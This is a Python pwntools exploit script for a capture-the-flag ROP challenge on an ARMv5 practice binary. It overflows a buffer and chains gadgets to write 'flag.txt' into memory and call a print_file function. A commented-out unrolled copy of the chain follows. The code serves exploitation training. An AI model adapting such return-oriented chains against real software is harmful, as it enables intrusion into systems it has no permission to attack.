from pwn import *


printf_file = 0x000104bc
str_nonexistent = 0x10654

write_addr = 0x21024
pop_r0_r1_r3_bx_r1 = 0x000105ec #  pop {r0, r1, r3} ; bx r1
pop_all = 0x00010634 #  pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}

strh_addr = 0x00010638 + 1 # : strh r0, [r7, #0x1e] ; nop ; lsrs r6, r5, #3 ; movs r1, r0 ; lsrs r4, r4, #3 ; movs r1, r0 ; bx lr

pop_r0_r1_r3_bx_r1 = 0x105ec


p = process('./fluff_armv5-hf')
p.recvuntil(b'> ')
buf = b'A' * 0x24

def mem_write(buf,addr,data):
    buf += data # r0
    buf += p32(pop_all) # r1
    buf += b'AAAA' # r3
    
    buf += b'AAAA' # r1
    buf += b'AAAA' # r2
    buf += b'AAAA' # r4
    buf += b'AAAA' # r5
    buf += b'AAAA' # r6
    buf += p32(addr - 0x1e ) # r7
    buf += b'AAAA' # r8
    buf += b'AAAA' # ip(r12)
    buf += p32(pop_r0_r1_r3_bx_r1) # lr(r14)
    buf += p32(strh_addr) # pc(r15)

    return buf

buf += p32(pop_r0_r1_r3_bx_r1)
buf = mem_write(buf,write_addr,b'fl\x00\x00')
buf = mem_write(buf,write_addr+2,b'ag\x00\x00')
buf = mem_write(buf,write_addr+4,b'.t\x00\x00')
buf = mem_write(buf,write_addr+6,b'xt\x00\x00')

buf += p32(write_addr) #r0
buf += p32(printf_file) # r1
buf += b'AAAA' # r3

p.send(buf)
p.interactive()

#buf += p32(pop_r0_r1_r3_bx_r1)
#buf += b'fl\x00\x00' # r0
#buf += p32(pop_all) # r1
#buf += b'AAAA' # r3
#
#buf += b'AAAA' # r1
#buf += b'AAAA' # r2
#buf += b'AAAA' # r4
#buf += b'AAAA' # r5
#buf += b'AAAA' # r6
#buf += p32(write_addr - 0x1e ) # r7
#buf += b'AAAA' # r8
#buf += b'AAAA' # ip(r12)
#buf += p32(pop_r0_r1_r3_bx_r1) # lr(r14)
#buf += p32(strh_addr) # pc(r15)
#
#buf += b'ag\x00\x00' # r0
#buf += p32(pop_all) # r1
#buf += b'AAAA' # r3
#
#buf += b'AAAA' # r1
#buf += b'AAAA' # r2
#buf += b'AAAA' # r4
#buf += b'AAAA' # r5
#buf += b'AAAA' # r6
#buf += p32(write_addr + 2 - 0x1e ) # r7
#buf += b'AAAA' # r8
#buf += b'AAAA' # ip(r12)
#buf += p32(pop_r0_r1_r3_bx_r1) # lr(r14)
#buf += p32(strh_addr) # pc(r15)
#
#buf += p32(write_addr) #r0
#buf += p32(printf_file) # r1
#buf += b'AAAA' # r3


